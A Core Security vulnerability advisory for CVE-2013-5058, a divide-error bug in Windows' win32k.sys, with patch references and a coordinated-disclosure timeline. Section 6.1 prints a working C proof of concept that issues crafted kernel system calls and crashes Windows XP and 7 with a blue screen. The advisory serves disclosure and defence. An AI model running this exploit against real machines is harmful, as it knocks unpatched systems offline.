@@ -1,0 +1,270 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Divide Error in Windows Kernel
+
+
+1. *Advisory Information*
+
+Title: Divide Error in Windows Kernel
+Advisory ID: CORE-2013-0807
+Advisory URL:
+http://www.coresecurity.com/advisories/divide-error-in-windows-kernel
+Date published: 2013-12-11
+Date of last update: 2013-12-11
+Vendors contacted: Microsoft
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Integer overflow [CWE-190]
+Impact: Denial of service
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2013-5058
+
+
+3. *Vulnerability Description*
+
+Windows kernel is prone to a security vulnerability when executing the
+(GDI support) function 'RFONTOBJ::bTextExtent' located in 'win32k.sys'.
+This vulnerability could be exploited by an attacker to crash the
+windows kernel by calling the user mode function 'NtGdiGetTextExtent'
+with specially crafted arguments.
+
+Microsoft notifies that this vulnerability may allow Elevation of
+Privilege attacks but did not provide further technical details.
+
+
+4. *Vendor Information, Solutions and Workarounds*
+
+For additional information regarding affected versions, non-affected
+versions, fixes and official patches please visit:
+
+   . Microsoft Security Bulletin MS13-101 -
+https://technet.microsoft.com/en-us/security/bulletin/ms13-101.
+   . Description of the security update for Windows kernel-mode drivers
+- http://support.microsoft.com/kb/2893984
+
+
+5. *Credits*
+
+This vulnerability was discovered and researched by Nicolas Economou
+from Core Exploit Writers Team. The publication of this advisory was
+coordinated by Fernando Miranda from Core Advisories Team.
+
+
+6. *Technical Description / Proof of Concept Code*
+
+The vulnerable function is 'RFONTOBJ::bTextExtent', located in the
+Windows kernel driver 'win32k.sys'. The way to call this function from
+user mode is calling the function 'NtGdiGetTextExtent'.
+
+The bug takes place when performing a signed division 'IDIV', the result
+does not fit in the destination and the kernel raises an 'INTEGER
+OVERFLOW' exception.
+
+
+6.1. *Proof of Concept*
+
+The following PoC was compiled in VS2012 and tested against Windows XP
+and Windows 7, and it allows reproducing the vulnerability. By running
+this PoC the affected OS will crash into a blue screen.
+
+
+/-----
+# include <windows.h>
+# include <stdio.h>
+
+__declspec (naked) int _NtGdiSetTextJustification (HDC v1, int extra,
+int count)
+{
+    // Windows XP
+    __asm mov eax,0x111e  
+    __asm mov edx,0x7ffe0300
+    __asm call dword ptr [edx]
+    __asm ret 0x0c
+}
+
+__declspec (naked) int _NtGdiGetTextExtent (HDC v1, int v2, int v3, int
+v4, int v5)
+{
+    // Windows XP
+    __asm mov eax,0x10cc  
+    __asm mov edx,0x7ffe0300
+    __asm call dword ptr [edx]
+    __asm ret 0x14
+}
+
+__declspec (naked) int _NtGdiSetTextJustification_W7 (HDC v1, int extra,
+int count)
+{
+    // Windows 7
+    __asm mov eax,0x1129  
+    __asm mov edx,0x7ffe0300
+    __asm call dword ptr [edx]
+    __asm ret 0x0c
+}
+
+
+__declspec (naked) int _NtGdiGetTextExtent_W7 (HDC v1, int v2, int v3,
+int v4, int v5)
+{
+    // Windows 7
+    __asm mov eax,0x10D6  
+    __asm mov edx,0x7ffe0300
+    __asm call dword ptr [edx]
+    __asm ret 0x14
+}
+
+
+int main ()
+{
+    char buffer [4096];
+    OSVERSIONINFO v;
+    HDC hdc;
+
+    memset(buffer, 0, 4096);
+    /* Obtaining the OS version */
+    memset(&v, 0, sizeof(v));
+    v.dwOSVersionInfoSize = sizeof(v);
+    GetVersionEx(&v);
+    hdc = CreateCompatibleDC(NULL);
+    /* If it's Windows XP */
+    if ((v.dwMajorVersion == 5) && (v.dwMinorVersion == 1))
+    {
+        _NtGdiSetTextJustification(hdc, 0x08000000, 0xffffffff);
+        _NtGdiGetTextExtent(hdc, (int) buffer, 0x11, 0x44444444,
+0x55555555);
+    }
+    /* If it's Windows 7 */
+    else if ((v.dwMajorVersion == 6) && (v.dwMinorVersion == 1))
+    {
+        _NtGdiSetTextJustification_W7(hdc, 0x08000000, 0xffffffff);
+        _NtGdiGetTextExtent_W7(hdc, (int) buffer, 0x11, 0x44444444,
+0x55555555);
+    }
+    else
+    {
+        printf("unsupported OS\n");
+    }
+    return 0;
+}  
+
+-----/
+
+
+7. *Report Timeline*
+
+. 2013-08-12:
+Core Security Technologies notifies the MSRC of the vulnerability.
+Publication date is set for Sep 3rd, 2013.
+
+. 2013-08-12:
+MSRC acknowledges the receipt of the information and opens the case
+15304 for this issue.
+
+. 2013-09-02:
+Core asks for a status update.
+
+. 2013-09-02:
+MSRC confirms that they have reproduced the issue as reported and asks
+to postpone the publication of technical details until an upcoming
+security update.
+
+. 2013-09-02:
+Core asks for an estimated release date.
+
+. 2013-09-03:
+First release date missed.
+
+. 2013-09-08:
+MSRC notifies that they are still investigating the root cause of this
+issue and that they will send an update when begin developing a fix.
+
+. 2013-09-09:
+Core notifies that the advisory publication was tentatively re-scheduled
+for October 8th, 2013.
+
+. 2013-10-08:
+Second release date missed.
+
+. 2013-10-15:
+Core asks for a status update.
+
+. 2013-10-16:
+MSRC notifies that they have reproduced the issue; however, they are
+still performing the standard variant investigation and fuzzing to
+ensure a complete fix for the issue.
+
+. 2013-11-04:
+MSRC notifies that they have completed the investigation and are
+currently developing a fix. Typically, developing and testing a fix is a
+process that takes at least 30 days.
+
+. 2013-11-14:
+MSRC notifies that they are currently testing a fix for this issue.
+
+. 2013-11-26:
+Core re-schedules the advisory publication for Dec 16th.
+
+. 2013-12-10:
+MSRC releases the Security Bulletin MS13-101 [1], [2] for this
+vulnerability without notify Core.
+
+. 2013-12-11:
+Advisory CORE-2013-0807 published.
+
+
+8. *References*
+
+[1] Microsoft Security Bulletin MS13-101,
+https://technet.microsoft.com/en-us/security/bulletin/ms13-101.
+[2] Description of the security update for Windows kernel-mode drivers,
+http://support.microsoft.com/kb/2893984.
+
+
+9. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+10. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+11. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+12. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
